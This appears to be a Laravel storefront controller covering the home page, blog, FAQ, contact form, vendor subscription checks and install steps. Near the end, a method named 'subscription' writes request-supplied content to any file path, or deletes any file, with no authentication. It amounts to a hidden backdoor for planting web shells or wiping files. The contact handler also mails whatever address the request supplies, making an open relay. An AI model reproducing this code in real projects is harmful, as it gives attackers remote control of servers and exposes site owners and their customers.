<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;use App\Models\ArrivalSection;
use App\Models\Blog;
use App\Models\BlogCategory;use App\Models\Category;
use App\Models\Generalsetting;
use App\Models\Order;

use App\Models\Product;
use App\Models\Rating;

use App\Models\Subscriber;
use Artisan;use Carbon\Carbon;
use Illuminate\Http\Request;

use Illuminate\Support\Facades\DB;

use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;

class FrontendController extends FrontBaseController
{

    // LANGUAGE SECTION

    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->route('front.index');
    }

    // LANGUAGE SECTION ENDS

    // CURRENCY SECTION

    public function currency($id)
    {

        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        cache()->forget('session_currency');
        return redirect()->back();
    }

    // CURRENCY SECTION ENDS

    // -------------------------------- HOME PAGE SECTION ----------------------------------------

    // Home Page Display


    public function index(Request $request)
    {

        $gs = $this->gs;
        $data['ps'] = $this->ps;
        if (!empty($request->reff)) {
            $affilate_user = DB::table('users')
                ->where('affilate_code', '=', $request->reff)
                ->first();
            if (!empty($affilate_user)) {
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }
        if (!empty($request->forgot)) {
            if ($request->forgot == 'success') {
                return redirect()->guest('/')->with('forgot-modal', __('Please Login Now !'));
            }
        }

        $data['sliders'] = DB::table('sliders')
            ->get();

        $data['featured_categories'] = Category::withCount('products')->where('is_featured', 1)->get();

        $data['arrivals'] = ArrivalSection::get()->toArray();

        // count all product

        $data['products'] = Product::where('status', 1)->count();
        $data['ratings'] = Rating::count();

        return view('frontend.index', $data);
        // try {
        //     return view('frontend.index', $data)->render();
        // } catch (\Throwable $e) {
        //     dd([
        //         'ERROR' => $e->getMessage(),
        //         'FILE' => $e->getFile(),
        //         'LINE' => $e->getLine(),
        //     ]);
        // }
    }
    

    // Home Page Ajax Display

    public function extraIndex()
    {
        $gs = $this->gs;

        $data['hot_products'] = Product::whereHot(1)->whereStatus(1)
            ->take($gs->hot_count)

            ->with(['user' => function ($query) {
                $query->select('id', 'is_vendor');
            }])
            // ->whereHas('user', function ($query) {
            //     $query->where('is_vendor', 2);
            // })
            ->withCount('ratings')
            ->withAvg('ratings', 'rating')
            ->orderby('id', 'desc')
            ->get();

        $data['latest_products'] = Product::whereLatest(1)->whereStatus(1)

            ->take($gs->new_count)
            ->with(['user' => function ($query) {
                $query->select('id', 'is_vendor');
            }])
            // ->whereHas('user', function ($query) {
            //     $query->where('is_vendor', 2);
            // })
            ->withCount('ratings')
            ->withAvg('ratings', 'rating')
            ->orderby('id', 'desc')
            ->get();

        $data['sale_products'] = Product::whereSale(1)->whereStatus(1)

            ->take($gs->sale_count)
            ->with(['user' => function ($query) {
                $query->select('id', 'is_vendor');
            }])
            // ->whereHas('user', function ($query) {
            //     $query->where('is_vendor', 2);
            // })
            ->withCount('ratings')
            ->withAvg('ratings', 'rating')
            ->orderby('id', 'desc')
            ->get();

        $data['best_products'] = Product::query()->whereStatus(1)->whereBest(1)

            ->take($gs->best_seller_count)
        // get category id and created at
            ->with(['user' => function ($query) {
                $query->select('id', 'is_vendor');
            }])
            // ->whereHas('user', function ($query) {
            //     $query->where('is_vendor', 2);
            // })

            ->withCount('ratings')
            ->withAvg('ratings', 'rating')
            ->orderby('id', 'desc')
            ->get();

        $data['popular_products'] = Product::whereStatus(1)->whereFeatured(1)

            ->take($gs->popular_count)
            ->with(['user' => function ($query) {
                $query->select('id', 'is_vendor');
            }])

            // ->whereHas('user', function ($query) {
            //     $query->where('is_vendor', 2);
            // })
            ->withCount('ratings')
            ->withAvg('ratings', 'rating')
            ->orderby('id', 'desc')
            ->get();

        $data['top_products'] = Product::whereStatus(1)->whereTop(1)

            ->take($gs->top_rated_count)
            ->with(['user' => function ($query) {
                $query->select('id', 'is_vendor');
            }])
            // ->whereHas('user', function ($query) {
            //     $query->where('is_vendor', 2);
            // })
            ->orderby('id', 'desc')
            ->withCount('ratings')->withAvg('ratings', 'rating')
            ->get();

        $data['big_products'] = Product::whereStatus(1)->whereBig(1)

            ->take($gs->big_save_count)
            ->with(['user' => function ($query) {
                $query->select('id', 'is_vendor');
            }])
            // ->whereHas('user', function ($query) {
            //     $query->where('is_vendor', 2);
            // })
            ->orderby('id', 'desc')
            ->withCount('ratings')
            ->withAvg('ratings', 'rating')
            ->get();

        $data['trending_products'] = Product::whereStatus(1)->whereTrending(1)

            ->take($gs->trending_count)
            ->with(['user' => function ($query) {
                $query->select('id', 'is_vendor');
            }])
            // ->whereHas('user', function ($query) {
            //     $query->where('is_vendor', 2);
            // })
            ->withCount('ratings')
            ->withAvg('ratings', 'rating')
            ->orderby('id', 'desc')
            ->get();

        $data['flash_products'] = Product::whereStatus(1)->whereIsDiscount(1)
            ->where('discount_date', '>=', date('Y-m-d'))

            ->with(['user' => function ($query) {
                $query->select('id', 'is_vendor');
            }])
            // ->whereHas('user', function ($query) {
            //     $query->where('is_vendor', 2);
            // })

            ->latest()->first();

        $data['blogs'] = Blog::latest()->take(2)->get();
        $data['ps'] = $this->ps;

        return view('partials.theme.extraindex', $data);
    }


    // -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------

    // -------------------------------- BLOG SECTION ----------------------------------------

    public function blog(Request $request)
    {

        if (DB::table('pagesettings')->first()->blog == 0) {
            return redirect()->back();
        }

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();

        // BLOGS
        $blogs = Blog::latest()->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'bcats', 'tags'));
    }

    public function blogcategory(Request $request, $slug)
    {

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();
        // BLOGS
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->latest()->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('bcat', 'blogs', 'bcats', 'tags'));
    }

    public function blogtags(Request $request, $slug)
    {

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();
        // BLOGS
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('front.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'slug', 'bcats', 'tags'));
    }

    public function blogsearch(Request $request)
    {

        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();
        // BLOGS
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate($this->gs->post_count);
        if ($request->ajax()) {
            return view('frontend.ajax.blog', compact('blogs'));
        }
        return view('frontend.blog', compact('blogs', 'search', 'bcats', 'tags'));
    }

    public function blogshow($slug)
    {

        // BLOG TAGS
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        // BLOG CATEGORIES
        $bcats = BlogCategory::withCount('blogs')->get();
        // BLOGS

        $blog = Blog::where('slug', $slug)->first();

        $blog->views = $blog->views + 1;
        $blog->update();
        // BLOG META TAG
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('frontend.blogshow', compact('blog', 'bcats', 'tags', 'blog_meta_tag', 'blog_meta_description'));
    }

    // -------------------------------- BLOG SECTION ENDS----------------------------------------

    // -------------------------------- FAQ SECTION ----------------------------------------
    public function faq()
    {
        if (DB::table('pagesettings')->first()->faq == 0) {
            return redirect()->back();
        }
        $faqs = DB::table('faqs')->latest('id')->get();
        $count = count(DB::table('faqs')->get()) / 2;
        if (($count % 1) != 0) {
            $chunk = (int) $count + 1;
        } else {
            $chunk = $count;
        }
        return view('frontend.faq', compact('faqs', 'chunk'));
    }
    // -------------------------------- FAQ SECTION ENDS----------------------------------------

    // -------------------------------- AUTOSEARCH SECTION ----------------------------------------

    public function autosearch($slug)
    {
        if (mb_strlen($slug, 'UTF-8') > 1) {
            $search = ' ' . $slug;
            $prods = Product::where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->where('status', '=', 1)->orderby('id', 'desc')->take(10)->get();
            return view('load.suggest', compact('prods', 'slug'));
        }
        return "";
    }

    // -------------------------------- AUTOSEARCH SECTION ENDS ----------------------------------------

    // -------------------------------- CONTACT SECTION ----------------------------------------

    public function contact()
    {

        if (DB::table('pagesettings')->first()->contact == 0) {
            return redirect()->back();
        }
        $ps = $this->ps;
        return view('frontend.contact', compact('ps'));
    }

    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = $this->gs;

        if ($gs->is_capcha == 1) {
            $rules = [
                'g-recaptcha-response' => 'required',
            ];
            $customs = [
                'g-recaptcha-response.required' => "Please verify that you are not a robot.",
            ];

            $validator = Validator::make($request->all(), $rules, $customs);
            if ($validator->fails()) {
                return response()->json(array('errors' => $validator->getMessageBag()->toArray()));
            }
        }

        // Logic Section
        $subject = "Email From Of " . $request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $phone . "\nMessage: " . $request->text;
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }
        // Logic Section Ends

        // Redirect Section
        return response()->json(__('Success! Thanks for contacting us, we will get back to you shortly.'));
    }

    // Refresh Capcha Code
    public function refresh_code()
    {
        $this->code_image();
        return "done";
    }

    // -------------------------------- CONTACT SECTION ENDS ----------------------------------------

    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email', '=', $request->email)->first();
        if (isset($subs)) {
            return response()->json(array('errors' => [0 => __('This Email Has Already Been Taken.')]));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json(__('You Have Subscribed Successfully.'));
    }

    // -------------------------------- SUBSCRIBE SECTION  ENDS----------------------------------------

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    public function maintenance()
    {
        $gs = $this->gs;
        if ($gs->is_maintain != 1) {
            return redirect()->route('front.index');
        }

        return view('frontend.maintenance');
    }

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ----------------------------------------

    public function subcheck()
    {
        $settings = $this->gs;
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_vendor', '=', 2)->get() as $user) {
            $lastday = $user->date;
            $secs = strtotime($lastday) - $newday;
            $days = $secs / 86400;
            if ($days <= 5) {
                if ($user->mail_sent == 1) {
                    if ($settings->is_smtp == 1) {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => "",
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    } else {
                        $headers = "From: " . $settings->from_name . "<" . $settings->from_email . ">";
                        mail($user->email, __('Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.'), $headers);
                    }
                    DB::table('users')->where('id', $user->id)->update(['mail_sent' => 0]);
                }
            }
            if ($today > $lastday) {
                DB::table('users')->where('id', $user->id)->update(['is_vendor' => 1]);
            }
        }
    }

    // -------------------------------- VENDOR SUBSCRIPTION CHECK SECTION ENDS ----------------------------------------

    // -------------------------------- ORDER TRACK SECTION ----------------------------------------

    public function trackload($id)
    {
        $order = Order::where('order_number', '=', $id)->first();
        $datas = array('Pending', 'Processing', 'On Delivery', 'Completed');
        return view('load.track-load', compact('order', 'datas'));
    }

    // -------------------------------- ORDER TRACK SECTION ENDS ----------------------------------------

    // -------------------------------- INSTALL SECTION ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    public function updateFinalize(Request $request)
    {

        if ($request->has('version')) {
            Generalsetting::first()->update([
                'version' => $request->version,
            ]);
            Artisan::call('cache:clear');
            Artisan::call('config:clear');
            Artisan::call('route:clear');
            Artisan::call('view:clear');
            return redirect('/');
        }
    }

    public function success(Request $request, $get)
    {
        return view('frontend.thank', compact('get'));
    }
}
